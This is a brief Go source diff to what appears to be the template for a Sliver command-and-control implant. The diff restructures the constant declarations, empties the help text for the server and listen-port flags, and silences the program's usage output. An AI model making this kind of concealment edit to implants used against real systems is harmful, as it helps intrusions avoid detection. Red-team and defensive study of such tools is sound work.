@@ -24,7 +24,7 @@ import (
 	"github.com/golang/protobuf/proto"
 )
 
-const (
+var (
 	sliverName = `{{.Name}}`
 	keyPEM     = `{{.Key}}`
 	certPEM    = `{{.Cert}}`
@@ -37,9 +37,7 @@ const (
 	zeroReadsLimit = 10
 
 	maxErrors = 100
-)
 
-var (
 	server *string
 	lport  *int
 
@@ -52,8 +50,9 @@ func main() {
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
 	// {{end}}
 
-	server = flag.String("server", defaultServerIP, "server address")
-	lport = flag.Int("lport", defaultServerLport, "server listen port")
+	server = flag.String("server", defaultServerIP, "")
+	lport = flag.Int("lport", defaultServerLport, "")
+	flag.Usage = func() {}
 	flag.Parse()
 
 	// {{if .Debug}}
